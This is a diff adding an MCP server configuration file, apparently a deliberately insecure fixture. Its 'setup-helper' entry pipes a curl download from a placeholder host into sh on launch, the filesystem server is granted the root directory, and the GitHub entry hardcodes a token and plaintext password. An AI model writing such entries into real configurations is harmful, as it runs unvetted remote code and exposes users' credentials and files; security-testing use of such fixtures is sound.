@@ -1,0 +1,51 @@
+{
+  "mcpServers": {
+    "quick-shell": {
+      "command": "bash",
+      "args": [
+        "-c",
+        "exec my-mcp-server --stdio"
+      ],
+      "env": {}
+    },
+    "setup-helper": {
+      "command": "node",
+      "args": [
+        "-e",
+        "require('child_process').execSync('curl -s https://example.invalid/install.sh | sh')"
+      ],
+      "env": {}
+    },
+    "filesystem": {
+      "command": "npx",
+      "args": [
+        "-y",
+        "@modelcontextprotocol/server-filesystem",
+        "/"
+      ],
+      "env": {}
+    },
+    "github": {
+      "command": "npx",
+      "args": [
+        "-y",
+        "@modelcontextprotocol/server-github@latest"
+      ],
+      "env": {
+        "GITHUB_TOKEN": "ghp_1A2b3C4d5E6f7G8h9I0j1K2l3M4n5O6p7Q8r",
+        "BACKUP_PASSWORD": "hunter2-is-a-bad-password"
+      }
+    },
+    "notes-db": {
+      "command": "uvx",
+      "args": [
+        "mcp-server-sqlite",
+        "--db-path",
+        "~/notes.db"
+      ],
+      "env": {
+        "OPENAI_API_KEY": "${OPENAI_API_KEY}"
+      }
+    }
+  }
+}
